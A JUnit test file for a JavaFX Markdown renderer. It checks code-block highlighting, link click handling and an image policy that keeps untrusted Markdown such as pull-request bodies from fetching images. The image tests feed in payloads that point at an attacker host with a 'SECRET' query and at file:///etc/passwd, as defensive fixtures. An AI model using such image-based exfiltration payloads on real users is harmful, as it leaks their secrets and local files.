package com.editora.ui;

import java.util.ArrayList;
import java.util.List;

import javafx.scene.Cursor;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.control.Label;
import javafx.scene.text.Text;
import javafx.scene.text.TextFlow;

import com.editora.editor.MarkdownRenderer;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInstance;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * FX-thread coverage of {@link MarkdownRenderer}'s fenced-code-block syntax highlighting: a block with a
 * known language renders as a {@code TextFlow} of tokenized {@code Text} runs, while an unknown-language
 * (or plain) block falls back to a plain {@code Label}.
 */
@Tag("fx")
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
class MarkdownRendererFxTest {

    @BeforeAll
    void setUp() throws Exception {
        FxTestSupport.bootToolkit();
    }

    private Node render(String md) throws Exception {
        return FxTestSupport.callOnFx(
                () -> MarkdownRenderer.renderDocument(MarkdownRenderer.parseToDocument(md), null));
    }

    private static <T> List<T> collect(Node root, Class<T> type) {
        List<T> out = new ArrayList<>();
        walk(root, type, out);
        return out;
    }

    private static <T> void walk(Node node, Class<T> type, List<T> out) {
        if (type.isInstance(node)) {
            out.add(type.cast(node));
        }
        if (node instanceof Parent p) {
            for (Node c : p.getChildrenUnmodifiable()) {
                walk(c, type, out);
            }
        }
    }

    @Test
    void fencedBlockWithLanguageRendersAsHighlightableTextFlow() throws Exception {
        // A known language renders as a TextFlow (the tokenized runs fill in off-thread; the token-class
        // assertion lives in the pure MarkdownRendererTest, which isn't subject to async timing).
        Node root = render("```java\npublic class X { void main() {} }\n```\n");
        boolean flow = collect(root, TextFlow.class).stream()
                .anyMatch(f -> f.getStyleClass().contains("md-code-block"));
        boolean label = collect(root, Label.class).stream()
                .anyMatch(l -> l.getStyleClass().contains("md-code-block"));
        assertTrue(flow, "known language ⇒ a TextFlow code block");
        assertFalse(label, "known language ⇒ not the plain Label code block");
    }

    @Test
    void fencedBlockWithoutLanguageStaysPlain() throws Exception {
        Node root = render("```\njust plain text\n```\n");
        boolean plainLabel = collect(root, Label.class).stream()
                .anyMatch(l -> l.getStyleClass().contains("md-code-block"));
        boolean highlightedFlow = collect(root, TextFlow.class).stream()
                .anyMatch(f -> f.getStyleClass().contains("md-code-block"));
        assertTrue(plainLabel, "no language ⇒ plain Label code block");
        assertFalse(highlightedFlow, "no language ⇒ not a highlighted TextFlow");
    }

    @Test
    void linkGetsClickHandlerAndHandCursorWhenWired() throws Exception {
        List<String> clicked = new ArrayList<>();
        Node root = FxTestSupport.callOnFx(() -> MarkdownRenderer.renderDocument(
                MarkdownRenderer.parseToDocument("[example](https://example.com)"), null, clicked::add));
        Text link = collect(root, Text.class).stream()
                .filter(t -> t.getStyleClass().contains("md-link"))
                .findFirst()
                .orElseThrow();
        assertEquals(Cursor.HAND, link.getCursor(), "a clickable link shows the hand cursor");
        link.getOnMouseClicked().handle(null); // the handler ignores its event arg
        assertEquals(List.of("https://example.com"), clicked, "click fires with the link's raw destination");
    }

    @Test
    void linkHasNoClickHandlerWithoutOneWired() throws Exception {
        // Non-interactive renders (print/PDF/popups) pass no handler — links must stay inert.
        Node root = render("[example](https://example.com)");
        Text link = collect(root, Text.class).stream()
                .filter(t -> t.getStyleClass().contains("md-link"))
                .findFirst()
                .orElseThrow();
        assertNull(link.getOnMouseClicked(), "no handler wired ⇒ link isn't clickable");
    }

    // --- image policy on surfaces whose Markdown the user did not write ---

    private static final String PIXEL = "data:image/png;base64,"
            + "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";

    private Node renderUntrusted(String md) throws Exception {
        return FxTestSupport.callOnFx(() -> MarkdownRenderer.renderDocument(
                MarkdownRenderer.parseToDocument(md), null, null, MarkdownRenderer.ImagePolicy.DATA_ONLY));
    }

    @Test
    void anUntrustedSurfaceShowsARemoteImageAsAPlaceholderAndNeverCreatesAnImageView() throws Exception {
        // Block image, inline image, and one behind a link: none may become a loading ImageView.
        Node root = renderUntrusted("![logo](https://attacker.invalid/p.png?d=SECRET)\n\n"
                + "text ![inline](http://attacker.invalid/i.png) more\n\n"
                + "![local](file:///etc/passwd)\n");
        assertTrue(collect(root, javafx.scene.image.ImageView.class).isEmpty(), "nothing is fetched");
        List<String> labels =
                collect(root, Label.class).stream().map(Label::getText).toList();
        assertTrue(labels.contains("[image: logo] https://attacker.invalid/p.png?d=SECRET"), labels.toString());
        assertTrue(labels.contains("[image: inline] http://attacker.invalid/i.png"), labels.toString());
        assertTrue(labels.contains("[image: local] file:///etc/passwd"), labels.toString());
    }

    @Test
    void anUntrustedSurfaceStillShowsASelfContainedDataImage() throws Exception {
        Node root = renderUntrusted("![dot](" + PIXEL + ")\n");
        assertEquals(1, collect(root, javafx.scene.image.ImageView.class).size());
    }

    @Test
    void theDocumentPreviewKeepsLoadingItsImages() throws Exception {
        // The default overloads are the document policy: a file: image still becomes an ImageView (it simply
        // stays blank here, the file does not exist — nothing is fetched from a network in this test).
        Node root = render("![pic](file:///nonexistent-editora-test/pic.png)\n");
        assertEquals(1, collect(root, javafx.scene.image.ImageView.class).size());
    }

    @Test
    void thePullRequestPaneRendersBodiesUnderTheDataOnlyPolicy() throws Exception {
        java.lang.reflect.Method m = PrReviewPane.class.getDeclaredMethod("renderMarkdown", String.class);
        m.setAccessible(true);
        Node root = FxTestSupport.callOnFx(
                () -> (Node) m.invoke(null, "![x](https://attacker.invalid/p.png)\n\n![ok](" + PIXEL + ")\n"));
        assertEquals(1, collect(root, javafx.scene.image.ImageView.class).size(), "only the data: image");
    }
}
